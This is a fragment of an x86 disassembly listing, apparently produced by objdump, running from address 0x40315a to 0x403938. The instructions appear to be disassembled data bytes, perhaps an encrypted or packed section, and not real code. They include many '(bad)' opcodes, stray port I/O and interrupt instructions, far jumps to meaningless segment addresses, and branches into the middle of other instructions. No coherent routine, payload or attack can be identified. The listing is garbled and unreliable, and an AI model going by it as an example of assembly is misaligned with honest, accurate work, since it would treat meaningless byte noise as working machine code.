  40315a:	mov    esp,0xd034bb0d
  40315f:	push   0x30
  403161:	jo     0x40316a
  403163:	inc    esi
  403164:	jle    0x4031c9
  403166:	loop   0x4031de
  403168:	push   cs
  403169:	lea    ecx,[edx+ebp*8+0x3b]
  40316d:	leave  
  40316e:	sbb    DWORD PTR [edx+0x43],eax
  403171:	jae    0x403130
  403173:	inc    edi
  403174:	call   0x8e9b41c9
  403179:	xor    dl,BYTE PTR [ecx+0x4dd7d634]
  40317f:	cld    
  403180:	and    dl,BYTE PTR [esi-0x7bc37ed1]
  403186:	ret    
  403187:	jmp    0x9f56:0x1ce6fc8f
  40318e:	mov    ebp,edi
  403190:	aas    
  403191:	push   ebp
  403192:	clc    
  403193:	out    dx,al
  403194:	xchg   edi,eax
  403195:	shr    DWORD PTR [ebx-0x4b48a1c9],1
  40319b:	inc    edi
  40319c:	imul   ebx,DWORD PTR [esi+0x54c4a230],0x8ff23911
  4031a6:	jb     0x403139
  4031a8:	or     BYTE PTR [eax+0x9],ah
  4031ab:	jmp    0x403180
  4031ad:	(bad)  
  4031ae:	daa    
  4031af:	test   eax,0xca09ecfe
  4031b4:	jmp    0x6ab4:0x5a313c90
  4031bb:	xchg   DWORD PTR [esi+0x1d],eax
  4031be:	jbe    0x40318d
  4031c0:	mov    ds:0x6471f4dd,al
  4031c5:	mov    DWORD PTR [ebx-0xc],edx
  4031c8:	add    al,0xeb
  4031ca:	xchg   esp,eax
  4031cb:	or     ch,BYTE PTR [ebx]
  4031cd:	aas    
  4031ce:	mov    bh,0xfe
  4031d0:	sub    dh,bl
  4031d2:	jne    0x4031e5
  4031d4:	out    dx,al
  4031d5:	dec    edi
  4031d6:	outs   dx,BYTE PTR ds:[esi]
  4031d7:	setbe  BYTE PTR [edi+0x26]
  4031db:	mov    esi,0x8eb68ea0
  4031e0:	xchg   edi,eax
  4031e1:	aas    
  4031e2:	adc    BYTE PTR [edi-0x36],dl
  4031e5:	or     esp,DWORD PTR [ecx]
  4031e7:	sub    al,0x86
  4031e9:	dec    eax
  4031ea:	adc    DWORD PTR [esi+esi*1+0x5],ebx
  4031ee:	mov    ds:0x41ab3f47,al
  4031f3:	and    esp,0x1b99f791
  4031f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031fa:	arpl   WORD PTR [eax-0x32650990],sp
  403200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403201:	int3   
  403202:	nop
  403203:	test   edi,esi
  403205:	loopne 0x403283
  403207:	je     0x40321f
  403209:	mov    DWORD PTR [esp+eax*8+0x1a],0x62f3814
  403211:	ds push cs
  403213:	sub    eax,0x90b7a3e6
  403218:	std    
  403219:	mov    eax,0x9f0f9a2d
  40321e:	push   0x5c992c63
  403223:	icebp  
  403224:	pop    eax
  403225:	int    0xe5
  403227:	in     eax,0x9e
  403229:	leave  
  40322a:	lea    ebp,[edx+0x718c79f0]
  403230:	jle    0x403299
  403232:	mov    al,0xbe
  403234:	push   ebx
  403235:	pop    edx
  403236:	add    eax,0x8afa3ec4
  40323b:	iret   
  40323c:	xor    DWORD PTR [ecx+0x6],0xb0a16c1d
  403243:	xchg   ebp,eax
  403244:	xchg   ecx,eax
  403245:	fstp   QWORD PTR [ebx]
  403247:	add    ebx,DWORD PTR [ebp+0x252c527c]
  40324d:	and    eax,0x8899d401
  403252:	pop    esp
  403253:	(bad)  
  403254:	pop    ecx
  403255:	fs sahf 
  403257:	sbb    ecx,DWORD PTR [ebx]
  403259:	enter  0x8e6f,0x71
  40325d:	stos   DWORD PTR es:[edi],eax
  40325e:	std    
  40325f:	dec    edi
  403260:	jmp    0xa740e52b
  403265:	xchg   ecx,eax
  403266:	fistp  WORD PTR [ebp+0x62eaf396]
  40326c:	xchg   ebx,eax
  40326d:	xchg   edi,ecx
  40326f:	out    0x38,eax
  403271:	sub    al,BYTE PTR [ebx]
  403273:	jae    0x403261
  403275:	cmp    eax,0xd33b2a0c
  40327a:	inc    ebp
  40327b:	adc    cl,BYTE PTR [eax-0xb]
  40327e:	loop   0x4032fd
  403280:	outs   dx,BYTE PTR ds:[esi]
  403281:	xor    bl,cl
  403283:	cmp    DWORD PTR [edi+0x75],edi
  403286:	add    esi,DWORD PTR [edx+0x306a6c47]
  40328c:	je     0x4032e9
  40328e:	in     eax,0x51
  403290:	(bad)  [ebp-0x7e]
  403293:	mov    cl,0x42
  403295:	leave  
  403296:	add    al,0x18
  403298:	ins    BYTE PTR es:[edi],dx
  403299:	adc    DWORD PTR [ecx],0xffffffa2
  40329c:	cs inc eax
  40329e:	lahf   
  40329f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032a0:	push   ebx
  4032a1:	mov    ebp,0x1971e31e
  4032a6:	pusha  
  4032a7:	dec    ecx
  4032a8:	sahf   
  4032a9:	lea    esp,[esi]
  4032ab:	inc    esp
  4032ac:	lods   al,BYTE PTR ds:[esi]
  4032ad:	repnz xchg esp,eax
  4032af:	and    BYTE PTR gs:[ebx-0x5a],0x74
  4032b4:	ss scas eax,DWORD PTR es:[edi]
  4032b6:	rcl    esi,0xf9
  4032b9:	add    BYTE PTR [esi+0x54],ah
  4032bc:	arpl   WORD PTR [eax+0x63],dx
  4032bf:	call   0x6fbe:0x61b9d5bc
  4032c6:	outs   dx,BYTE PTR ds:[esi]
  4032c7:	add    edx,DWORD PTR [ebp-0x29]
  4032ca:	add    DWORD PTR [eax-0x4ca869b],edi
  4032d0:	pop    ss
  4032d1:	dec    edx
  4032d2:	callw  0xee3f
  4032d6:	fadd   QWORD PTR [eax-0x50694a1b]
  4032dc:	inc    ebp
  4032dd:	jo     0x40327f
  4032df:	inc    ebp
  4032e0:	in     eax,0xe
  4032e2:	mov    ah,0xad
  4032e4:	mov    esp,ds
  4032e6:	stos   BYTE PTR es:[edi],al
  4032e7:	push   esi
  4032e8:	mov    al,ds:0x50e74917
  4032ed:	sbb    cl,BYTE PTR [esi+0x3e]
  4032f0:	(bad)  
  4032f1:	or     ch,BYTE PTR [eax-0x3fb82a9]
  4032f7:	mov    ch,0xa6
  4032f9:	cmp    dl,BYTE PTR [ecx]
  4032fb:	sti    
  4032fc:	and    esp,DWORD PTR [edi]
  4032fe:	jle    0x996568e0
  403304:	add    edx,DWORD PTR [esi+edx*8]
  403307:	int    0xdd
  403309:	xchg   ebp,eax
  40330a:	jl     0x4032f5
  40330c:	jo     0x403328
  40330e:	in     eax,dx
  40330f:	pop    esp
  403310:	out    0xd8,eax
  403312:	bnd ja 0x4032a4
  403315:	pop    ss
  403316:	gs clc 
  403318:	(bad)  
  403319:	fstp   DWORD PTR [eax+0x4dc94b63]
  40331f:	ss pop ss
  403321:	ins    DWORD PTR es:[edi],dx
  403322:	xchg   esi,eax
  403323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403324:	stos   DWORD PTR es:[edi],eax
  403325:	test   DWORD PTR [eax],ebp
  403327:	jmp    0xf149d68
  40332c:	sbb    ch,BYTE PTR ss:[edx]
  40332f:	lds    ecx,FWORD PTR [edx-0x4bf9a0c9]
  403335:	jo     0x403382
  403337:	or     ah,cl
  403339:	add    DWORD PTR [edi+0x37de90e6],esi
  40333f:	xchg   ebx,eax
  403340:	dec    ebx
  403341:	lea    esp,[eax+0x6e]
  403344:	stos   BYTE PTR es:[edi],al
  403345:	dec    ebx
  403346:	add    al,0xc9
  403348:	sbb    al,0x7c
  40334a:	sbb    al,0xba
  40334c:	fcom   QWORD PTR [eax+0x4ed728a8]
  403352:	cmp    ah,BYTE PTR [esi]
  403354:	gs popf 
  403356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403357:	push   0x35
  403359:	pop    eax
  40335a:	(bad)  
  40335b:	adc    DWORD PTR [esi+0x77],esi
  40335e:	dec    esi
  40335f:	sub    bh,bl
  403361:	or     bh,ch
  403363:	cmp    al,BYTE PTR [eax-0x64]
  403366:	out    0x79,eax
  403368:	pusha  
  403369:	mov    edi,0x71021405
  40336e:	push   edi
  40336f:	in     al,0x8f
  403371:	int    0x55
  403373:	jmp    0x403302
  403375:	(bad)  
  403376:	jns    0x4033af
  403378:	call   DWORD PTR [ebx]
  40337a:	add    DWORD PTR [esi+0x6d29ab34],eax
  403380:	jnp    0x403303
  403382:	ins    BYTE PTR es:[edi],dx
  403383:	mul    BYTE PTR [esi-0x322a8ce2]
  403389:	cs scas al,BYTE PTR es:[edi]
  40338b:	mov    cl,0xc5
  40338d:	adc    al,0x31
  40338f:	clc    
  403390:	and    DWORD PTR [ebp+0x4],eax
  403393:	stos   DWORD PTR es:[edi],eax
  403394:	test   eax,0x7f50eac
  403399:	mov    ds,WORD PTR [bp+si+0x2bbf]
  40339e:	push   edx
  40339f:	lock lods eax,DWORD PTR ds:[esi]
  4033a1:	and    eax,DWORD PTR [esi]
  4033a3:	dec    edx
  4033a4:	add    al,0x23
  4033a6:	(bad)  
  4033a8:	je     0x403361
  4033aa:	jnp    0x403428
  4033ac:	sar    BYTE PTR [eax],1
  4033ae:	leave  
  4033af:	mov    dh,0x4f
  4033b1:	ret    
  4033b2:	mov    dh,0x3d
  4033b4:	mov    edi,0x2db67daf
  4033b9:	addr16 cdq 
  4033bb:	mov    ah,0xf2
  4033bd:	outs   dx,DWORD PTR ds:[esi]
  4033be:	jl     0x403409
  4033c0:	jg     0x40340e
  4033c2:	ins    BYTE PTR es:[edi],dx
  4033c3:	stos   BYTE PTR es:[edi],al
  4033c4:	lds    esp,FWORD PTR [ebx+eiz*8]
  4033c7:	fwait
  4033c8:	jo     0x403443
  4033ca:	ss cwde 
  4033cc:	pop    edx
  4033cd:	loope  0x403441
  4033cf:	retf   0x3991
  4033d2:	mov    DWORD PTR [edx],edi
  4033d4:	and    al,0x5a
  4033d6:	pop    ebp
  4033d7:	lock push es
  4033d9:	popa   
  4033da:	out    dx,al
  4033db:	add    ah,BYTE PTR [edx+edx*1-0x68]
  4033df:	sub    cl,BYTE PTR [esi-0x41d530cd]
  4033e5:	xchg   edi,eax
  4033e6:	imul   DWORD PTR ds:0x88e2f6af
  4033ec:	out    0xa6,eax
  4033ee:	sub    eax,0x7b180d72
  4033f3:	mov    al,ds:0x23a82520
  4033f8:	add    eax,0x7822c9a7
  4033fd:	push   cs
  4033fe:	or     esp,DWORD PTR [edx+0x28840a98]
  403404:	in     eax,dx
  403405:	push   0x57
  403407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403408:	setl   BYTE PTR [ebp-0x4e88bdd2]
  40340f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403410:	or     edi,DWORD PTR [ebx-0x5dbfa9ea]
  403416:	jo     0x4033f4
  403418:	mov    ds:0x996a16dc,eax
  40341d:	pop    edx
  40341e:	inc    edx
  40341f:	scas   al,BYTE PTR es:[edi]
  403420:	and    BYTE PTR [ebp-0x49579e70],ah
  403426:	mov    edx,0xa3633587
  40342b:	sbb    eax,0x68b98fe5
  403430:	out    dx,eax
  403431:	pop    esp
  403432:	ja     0x403472
  403434:	push   es
  403435:	(bad)  [ebp+0x27eb9866]
  40343b:	push   edi
  40343c:	pop    ecx
  40343d:	outs   dx,DWORD PTR ds:[esi]
  40343e:	pop    eax
  40343f:	xchg   edx,eax
  403440:	mov    al,ds:0x4964f44e
  403445:	dec    edi
  403446:	jmp    0x4033fb
  403448:	cmp    al,0xc4
  40344a:	push   edi
  40344b:	add    DWORD PTR [ecx-0x3a97a6f3],edx
  403451:	sub    al,0x59
  403453:	shl    ebp,1
  403455:	(bad)  
  403456:	cmp    eax,0x1d3708b2
  40345b:	shl    BYTE PTR [eax+eiz*4-0x67009ea],1
  403462:	jbe    0x40344c
  403464:	inc    ebx
  403465:	lods   eax,DWORD PTR ds:[esi]
  403466:	gs in  al,dx
  403468:	test   eax,0xc7ad215c
  40346d:	inc    edi
  40346e:	pop    edi
  40346f:	dec    esi
  403470:	jle    0x403489
  403472:	sub    eax,0xeeec272d
  403477:	ja     0x403418
  403479:	push   ecx
  40347a:	shr    BYTE PTR [esi-0x5e],1
  40347d:	or     BYTE PTR [edi],dl
  40347f:	dec    esi
  403480:	rol    BYTE PTR [esi+eiz*2-0x6],0xe8
  403485:	adc    eax,0xaa53e300
  40348a:	sbb    bl,BYTE PTR [ecx+0x5b]
  40348d:	sbb    eax,0xd42c11ad
  403492:	(bad)  
  403493:	in     eax,dx
  403494:	sbb    edx,DWORD PTR [eax-0x4f]
  403497:	sbb    esp,edi
  403499:	jmp    0x6795af49
  40349e:	addr16 in al,0x87
  4034a1:	sar    al,0xc4
  4034a4:	jno    0x4034bc
  4034a6:	cdq    
  4034a7:	les    esi,FWORD PTR [ebp+0xa934308]
  4034ad:	mov    al,0x2c
  4034af:	jae    0x403443
  4034b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b2:	(bad)
  4034b5:	leave  
  4034b6:	pop    eax
  4034b7:	inc    eax
  4034b8:	fdivr  QWORD PTR [esp+ebx*1]
  4034bb:	fiadd  DWORD PTR [eax-0x737d86c8]
  4034c1:	mov    dl,0x36
  4034c3:	sahf   
  4034c4:	test   DWORD PTR [edx-0x39e6bc38],esi
  4034ca:	cmp    ebp,DWORD PTR [edi+0x6a]
  4034cd:	les    eax,FWORD PTR [edi]
  4034cf:	cmp    edi,esp
  4034d1:	in     al,0x27
  4034d3:	add    DWORD PTR [ebx-0x6a59309b],ecx
  4034d9:	popa   
  4034da:	(bad)
  4034de:	repnz mov BYTE PTR [ebp+0x2d42e9fb],bl
  4034e5:	dec    ecx
  4034e6:	lods   eax,DWORD PTR ds:[esi]
  4034e7:	lds    ecx,FWORD PTR [edx+0x1f036fe6]
  4034ed:	aad    0x7e
  4034ef:	int3   
  4034f0:	call   0xd967:0x9d10c49
  4034f7:	loopne 0x40347d
  4034f9:	mov    DWORD PTR [edi+0x29b949a4],esi
  4034ff:	dec    ecx
  403500:	xchg   ecx,eax
  403501:	enter  0xb4f8,0x6c
  403505:	dec    edi
  403506:	pop    ebp
  403507:	cmp    ah,bh
  403509:	rcl    DWORD PTR [ecx-0x2b95ec41],1
  40350f:	jno    0x4034ba
  403511:	fadd   st,st(4)
  403513:	mov    ds:0x2dedda77,al
  403518:	cmp    bl,bl
  40351a:	add    ah,BYTE PTR [esi]
  40351c:	aas    
  40351d:	cmc    
  40351e:	daa    
  40351f:	shl    DWORD PTR [edi],0x81
  403522:	popf   
  403523:	xchg   ebx,eax
  403524:	fidiv  WORD PTR [esi-0x56e54872]
  40352a:	dec    edx
  40352b:	mov    edi,0x50394fa1
  403530:	xor    BYTE PTR [ecx+0x59],dh
  403533:	ins    BYTE PTR es:[edi],dx
  403534:	dec    ebp
  403535:	or     ah,BYTE PTR [esi+0x7d]
  403538:	dec    esi
  403539:	xchg   edi,eax
  40353a:	dec    edx
  40353b:	fst    QWORD PTR [ebx-0x71]
  40353e:	dec    ecx
  40353f:	mov    ah,BYTE PTR [edi-0x5abea645]
  403545:	mov    al,ds:0x48aca824
  40354a:	retf   
  40354b:	ret    
  40354c:	iret   
  40354d:	scas   al,BYTE PTR es:[edi]
  40354e:	mov    esi,0x15dcb488
  403553:	or     ah,BYTE PTR [eax-0x74]
  403556:	sub    DWORD PTR [ebp-0x7123819b],ebx
  40355c:	cdq    
  40355d:	sar    DWORD PTR [esi],cl
  40355f:	and    bh,BYTE PTR [ecx+0x7adee7ff]
  403565:	repz push 0x425cb33b
  40356b:	stc    
  40356c:	call   0x6bf5faa3
  403571:	push   edx
  403572:	xor    dh,al
  403574:	cmc    
  403575:	enter  0x8099,0x37
  403579:	sahf   
  40357a:	lock push es
  40357c:	(bad)  
  40357d:	and    BYTE PTR [ebx+0x331100af],bh
  403583:	clc    
  403584:	cmp    BYTE PTR [esi+ecx*4+0x27],ch
  403588:	xor    eax,DWORD PTR [edx-0xd]
  40358b:	bound  edx,QWORD PTR [edi+0x5c]
  40358e:	dec    ebx
  40358f:	mov    ?,WORD PTR [eax]
  403591:	into   
  403592:	mov    esp,0xc8b22c0a
  403597:	xor    dl,bh
  403599:	push   cs
  40359a:	jbe    0x40359d
  40359c:	adc    esp,DWORD PTR [edx+0x17cc3ae9]
  4035a2:	pop    edi
  4035a3:	xchg   ebx,eax
  4035a4:	jmp    0x403585
  4035a6:	and    BYTE PTR [edx-0x6c],ch
  4035a9:	push   cs
  4035aa:	sub    ebp,edx
  4035ac:	stos   DWORD PTR es:[edi],eax
  4035ad:	push   0x51
  4035af:	jo     0x40360f
  4035b1:	outs   dx,DWORD PTR ds:[esi]
  4035b2:	pusha  
  4035b3:	out    dx,al
  4035b4:	push   edx
  4035b5:	pop    ebx
  4035b6:	sbb    esp,DWORD PTR [edx]
  4035b8:	test   BYTE PTR [esi+0x24344890],0x9c
  4035bf:	add    eax,0xdd065147
  4035c4:	lods   eax,DWORD PTR ds:[esi]
  4035c5:	mov    eax,ecx
  4035c7:	mov    eax,0x6ac608b0
  4035cc:	ins    DWORD PTR es:[edi],dx
  4035cd:	inc    eax
  4035ce:	jo     0x40359c
  4035d0:	xchg   ebx,eax
  4035d1:	xchg   edi,eax
  4035d2:	cmp    BYTE PTR [edi-0x6c97734],0x2e
  4035d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035da:	stos   BYTE PTR es:[edi],al
  4035db:	pop    es
  4035dc:	aad    0x85
  4035de:	adc    DWORD PTR [esi+eax*4-0x334ce0db],eax
  4035e5:	ds call 0x9520:0xfaa934b
  4035ed:	xor    BYTE PTR [eax],0xf9
  4035f0:	mov    ecx,0xc80937e5
  4035f5:	int3   
  4035f6:	stc    
  4035f7:	push   edx
  4035f8:	mov    BYTE PTR [ecx+0x50],cl
  4035fb:	add    BYTE PTR [ecx-0x61],dh
  4035fe:	xchg   ecx,edx
  403600:	mov    ebx,0x4358512f
  403605:	sbb    dh,dl
  403607:	fs pop es
  403609:	push   esi
  40360a:	emms   
  40360c:	jp     0x40365c
  40360e:	shr    DWORD PTR [eax+edi*2],cl
  403611:	cli    
  403612:	shl    DWORD PTR [ebx+0x185ab3eb],cl
  403618:	cld    
  403619:	or     edi,ebx
  40361b:	arpl   WORD PTR [edi],si
  40361d:	xchg   ecx,edi
  40361f:	mov    ecx,0xa554bc32
  403624:	jnp    0x4035fd
  403626:	sbb    eax,0xb7357bc7
  40362b:	fs mov bh,0x2b
  40362e:	jo     0x403613
  403630:	in     al,0xd4
  403632:	jmp    0x4035dc
  403634:	jmp    0x4035c1
  403636:	push   ebx
  403637:	imul   esi,esp,0x67
  40363a:	jmp    0xc8c2:0x9760a733
  403641:	pop    DWORD PTR [esi-0x5b1e12f0]
  403647:	jp     0x4035db
  403649:	pushf  
  40364a:	and    eax,DWORD PTR [ecx*8+0x28d7864]
  403651:	sbb    DWORD PTR [ebp-0x46],eax
  403654:	into   
  403655:	pop    eax
  403656:	xor    bl,dh
  403658:	adc    ebp,DWORD PTR [ebp-0x6031ceee]
  40365e:	and    eax,0xe0b0835
  403663:	mov    ch,0xc1
  403665:	xchg   BYTE PTR [esi+ecx*1-0x32],dl
  403669:	(bad)  
  40366a:	mov    eax,0xf396fa13
  40366f:	ins    BYTE PTR es:[edi],dx
  403670:	shr    DWORD PTR ds:0xc35d59cf,cl
  403676:	jnp    0x403692
  403678:	xor    ah,BYTE PTR [ebx+0x35]
  40367b:	pop    esp
  40367c:	mov    al,ds:0x372ca311
  403681:	addr16 int 0xc6
  403684:	add    bl,dl
  403686:	add    eax,0x16392ff3
  40368b:	push   ebx
  40368c:	cmp    BYTE PTR [edx+eax*4-0x75],ah
  403690:	push   esi
  403691:	cli    
  403692:	mov    eax,0xdd5301a1
  403697:	and    eax,esi
  403699:	out    0x2d,al
  40369b:	adc    BYTE PTR [edx],dh
  40369d:	jno    0x4036f2
  40369f:	mov    dh,0xbc
  4036a1:	jbe    0x403670
  4036a3:	mov    ch,0xab
  4036a5:	neg    DWORD PTR [ebx+0x33eeaa3e]
  4036ab:	mov    al,0x8d
  4036ad:	fucomp st(7)
  4036af:	in     al,dx
  4036b0:	sbb    esi,ebp
  4036b2:	mov    edi,DWORD PTR [edx]
  4036b4:	pop    edi
  4036b5:	push   0xffffff85
  4036b7:	mov    BYTE PTR [ecx+0x24],0x21
  4036bb:	(bad)  
  4036bc:	mov    DWORD PTR fs:[ebx-0x19],esi
  4036c0:	(bad)  
  4036c1:	rcl    al,1
  4036c3:	and    eax,0xcd6277fc
  4036c8:	das    
  4036c9:	jne    0x4036a1
  4036cb:	out    dx,al
  4036cc:	pop    ecx
  4036cd:	in     al,dx
  4036ce:	fcom   QWORD PTR [ecx+0x7873e951]
  4036d4:	xor    al,0x3c
  4036d6:	rol    BYTE PTR [esp+ebx*2-0x7e28394c],0x6d
  4036de:	jns    0x4036a6
  4036e0:	xor    bl,dl
  4036e2:	dec    ebx
  4036e3:	aas    
  4036e4:	cmp    edx,esp
  4036e6:	mov    esp,0x970725b1
  4036eb:	pop    esi
  4036ec:	int3   
  4036ed:	mov    ebp,0x55394d3c
  4036f2:	and    esi,DWORD PTR fs:[ebx]
  4036f5:	cld    
  4036f6:	push   esp
  4036f7:	(bad)  
  4036f8:	fadd   DWORD PTR [esi]
  4036fa:	mov    ds:0xe746154c,al
  4036ff:	sahf   
  403700:	out    0x64,eax
  403702:	aaa    
  403703:	adc    cl,BYTE PTR [eax+0x23c2a0bc]
  403709:	ror    BYTE PTR [edi-0x9],0x40
  40370d:	int    0xba
  40370f:	sub    al,0x4
  403711:	arpl   WORD PTR [edx-0x77],bp
  403714:	iret   
  403715:	and    eax,0x15486de0
  40371a:	and    BYTE PTR [ebp+0x45],al
  40371d:	xchg   esp,eax
  40371e:	test   BYTE PTR es:[esi-0x56],bl
  403722:	cwde   
  403723:	and    al,0x27
  403725:	je     0x403788
  403727:	sbb    BYTE PTR [edi],al
  403729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40372a:	ins    DWORD PTR es:[edi],dx
  40372b:	add    al,0x77
  40372d:	(bad)  [esp+esi*2]
  403730:	jns    0x4036e2
  403732:	sub    BYTE PTR [edx-0x4e],al
  403735:	retf   
  403736:	mov    ebp,0x1b1a0a28
  40373b:	into   
  40373c:	test   eax,0x5072fba7
  403741:	adc    BYTE PTR [esi],cl
  403743:	xchg   BYTE PTR [esi],cl
  403745:	dec    DWORD PTR [ecx+0x4de35c2d]
  40374b:	sti    
  40374c:	bound  ecx,QWORD PTR [edi+0x7f]
  40374f:	test   DWORD PTR [eax],esp
  403751:	xchg   DWORD PTR [ebp+ebp*4-0x72],esi
  403755:	add    esp,edi
  403757:	push   edx
  403758:	mov    ds:0xdf417bb5,eax
  40375d:	pop    eax
  40375e:	pop    ss
  40375f:	mov    ds:0x15f97185,al
  403764:	iret   
  403765:	ss inc esi
  403767:	xor    al,BYTE PTR [edi-0x60]
  40376a:	pusha  
  40376b:	adc    DWORD PTR [esp+esi*2-0x52],eax
  40376f:	sub    ecx,DWORD PTR [esi-0x6]
  403772:	adc    al,0x1c
  403774:	hlt    
  403775:	adc    DWORD PTR [eax],edx
  403777:	cmp    BYTE PTR [ebx],cl
  403779:	push   edx
  40377a:	sub    al,0xb9
  40377c:	or     bh,dh
  40377e:	sub    eax,edx
  403780:	add    edx,edx
  403782:	int3   
  403783:	mov    esi,0xd4aa9c08
  403788:	jle    0x4037cb
  40378a:	es ss popa 
  40378d:	push   ebp
  40378e:	mov    DWORD PTR [ebp-0x30b47af1],edi
  403794:	cmp    eax,0xb4e74602
  403799:	inc    edx
  40379a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40379b:	sub    edi,DWORD PTR [eax]
  40379d:	xchg   DWORD PTR [eax-0x74f35012],ebx
  4037a3:	jae    0x40380c
  4037a5:	not    BYTE PTR [eax-0x3d789ff5]
  4037ab:	repnz fstp DWORD PTR [ecx+ebp*2]
  4037af:	mov    gs,WORD PTR [edx+0x3d4bcfd9]
  4037b5:	push   ss
  4037b6:	jg     0x403750
  4037b8:	aad    0x1
  4037ba:	mov    ebx,0xc50494bf
  4037bf:	xchg   ch,ch
  4037c1:	dec    edx
  4037c2:	nop
  4037c3:	sbb    BYTE PTR [ebx+0x292b6ccf],bl
  4037c9:	push   ebp
  4037ca:	repz xor eax,0xfa993aaf
  4037d0:	aaa    
  4037d1:	lock jmp 0x6eba:0x31d02e5
  4037d9:	je     0x403844
  4037db:	test   DWORD PTR [esi-0x30e88f32],0xd12d4442
  4037e5:	add    esp,DWORD PTR [ebx+0x51a8e332]
  4037eb:	adc    eax,0x310f63a9
  4037f0:	test   al,0xd7
  4037f2:	cmc    
  4037f3:	popa   
  4037f4:	dec    edi
  4037f5:	(bad)  
  4037f6:	push   cs
  4037f7:	std    
  4037f8:	mov    dh,0x20
  4037fa:	mov    eax,ds:0x18f3f43d
  4037ff:	and    DWORD PTR [eax-0x1],0x70182957
  403806:	mov    bl,0x9f
  403808:	js     0x403836
  40380a:	dec    edx
  40380b:	inc    BYTE PTR [esp+eax*1]
  40380e:	sbb    ah,cl
  403810:	cs ss inc bp
  403814:	add    edx,DWORD PTR [esi-0x28]
  403817:	ret    0x4d22
  40381a:	mov    DWORD PTR [eax+0x6cc7b695],ecx
  403820:	xchg   edi,eax
  403821:	and    BYTE PTR [ebp+0x9],ah
  403824:	outs   dx,DWORD PTR ds:[esi]
  403825:	add    bh,ah
  403827:	(bad)  
  403828:	js     0x403803
  40382a:	mov    al,ds:0x3cf1f005
  40382f:	jae    0x4037ce
  403831:	ret    
  403832:	cmp    esi,DWORD PTR [eax]
  403834:	and    eax,0x95d4fd3c
  403839:	jb     0x4037f3
  40383b:	scas   al,BYTE PTR es:[edi]
  40383c:	(bad)  
  40383e:	mov    ds:0x7012684f,al
  403843:	add    bh,bh
  403845:	fwait
  403846:	push   cs
  403847:	adc    ah,al
  403849:	sbb    BYTE PTR [eax-0x45],al
  40384c:	push   ecx
  40384d:	scas   eax,DWORD PTR es:[edi]
  40384e:	xchg   DWORD PTR [ebx],eax
  403850:	loope  0x403883
  403852:	push   ecx
  403853:	fs jmp 0x9302e287
  403859:	inc    ebp
  40385a:	iret   
  40385b:	push   ds
  40385c:	and    DWORD PTR [esi+0xdb3f977],ebx
  403862:	cld    
  403863:	pop    ss
  403864:	sbb    dl,al
  403866:	loope  0x4038cc
  403868:	pmaxub mm5,QWORD PTR [ecx+eiz*1-0x4179f973]
  403870:	jo     0x4038d3
  403872:	popa   
  403873:	lea    eax,[ebp-0x62]
  403876:	outs   dx,BYTE PTR ds:[esi]
  403877:	repnz push esi
  403879:	mov    edi,0x21b3cd51
  40387e:	pop    edi
  40387f:	retf   0xd404
  403882:	ja     0x403811
  403884:	scas   al,BYTE PTR es:[edi]
  403885:	xlat   BYTE PTR ds:[ebx]
  403886:	(bad)  
  403887:	sub    DWORD PTR [edx+ebx*4],edx
  40388a:	adc    dl,ah
  40388c:	sar    BYTE PTR [esi],cl
  40388e:	xor    DWORD PTR [ecx-0x27],0xeb1be10d
  403895:	add    esp,DWORD PTR [esi-0x54]
  403898:	int3   
  403899:	or     bl,BYTE PTR [edx]
  40389b:	sbb    edi,DWORD PTR [eax+esi*4+0x1c]
  40389f:	cwde   
  4038a0:	push   0xa33ecb99
  4038a5:	and    edi,DWORD PTR [edi]
  4038a7:	in     al,0xd2
  4038a9:	(bad)  
  4038aa:	out    0x99,al
  4038ac:	sub    ah,BYTE PTR [edi+0x102b8509]
  4038b2:	mov    ch,0x2f
  4038b4:	iret   
  4038b5:	addr16 pop edx
  4038b7:	add    BYTE PTR ds:[esi+0x1a],dl
  4038bb:	push   ebp
  4038bc:	dec    ebx
  4038bd:	popf   
  4038be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038bf:	(bad)  
  4038c0:	es dec esi
  4038c2:	lea    ecx,[eax-0x32df8ff6]
  4038c8:	cs ins DWORD PTR es:[edi],dx
  4038ca:	into   
  4038cb:	xchg   esp,eax
  4038cc:	pop    ebx
  4038cd:	jg     0x403909
  4038cf:	jmp    0xb97733c6
  4038d4:	lds    ecx,FWORD PTR [ecx]
  4038d6:	pusha  
  4038d7:	pop    esi
  4038d8:	popf   
  4038d9:	push   cs
  4038da:	popa   
  4038db:	scas   eax,DWORD PTR es:[edi]
  4038dc:	push   ebx
  4038dd:	mov    dh,0xc2
  4038df:	push   es
  4038e0:	dec    ebx
  4038e1:	or     esp,DWORD PTR [eax]
  4038e3:	pop    esi
  4038e4:	jb     0x403883
  4038e6:	xchg   ebx,eax
  4038e7:	aaa    
  4038e8:	push   ebx
  4038e9:	daa    
  4038ea:	(bad)  [edi+0x19]
  4038ed:	xor    WORD PTR [eax+esi*4],dx
  4038f1:	jmp    0x403958
  4038f3:	mov    ah,0x6e
  4038f5:	jge    0x4038be
  4038f7:	call   0x4e60398d
  4038fc:	mov    eax,ds:0x6a6db386
  403901:	add    DWORD PTR [eax-0x4aae1684],edi
  403907:	js     0x403955
  403909:	sbb    ecx,DWORD PTR ds:0x8bf857c4
  40390f:	aaa    
  403910:	inc    eax
  403911:	xchg   ebp,eax
  403912:	adc    al,bl
  403914:	mov    eax,es:0x7fee33c7
  40391a:	enter  0xaa10,0x88
  40391e:	pop    eax
  40391f:	adc    eax,0xf112eb51
  403924:	jle    0x4039a1
  403926:	fist   DWORD PTR [eax]
  403928:	push   ecx
  403929:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40392b:	scas   al,BYTE PTR es:[edi]
  40392c:	cli    
  40392d:	sahf   
  40392e:	adc    eax,DWORD PTR [ebx]
  403930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403931:	(bad)  
  403932:	imul   edi,DWORD PTR [edi+0x53],0x67
  403936:	xchg   bl,ch
  403938:	jae    0x4038f3
